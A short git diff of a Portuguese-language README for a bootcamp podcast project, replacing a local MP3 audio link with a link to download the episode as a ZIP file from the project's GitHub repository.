@@ -30,7 +30,7 @@ Então, se você ou alguém que você conhece está sem computador, não se dese
 E aí, gostaram da dica? Espero que sim! Até o próximo episódio, pessoal! E lembrem-se: a tecnologia está aqui para tornar nossas vidas mais fáceis e divertidas, aprendam a usá-las.
 
 ## Link para o Áudio
-🎧 **Ouça agora:** [Clique aqui para ouvir o podcast](Podcast/speech_20250417151145535.mp3)
+📥 [Clique aqui para baixar o podcast em ZIP](https://github.com/laispimentel/bottcamp_Microsoft_50_anos/raw/main/Podcast/speech_20250417151145535.zip)
 
 ## Como Usar
 1. Acesse o link do áudio acima para ouvir o podcast.
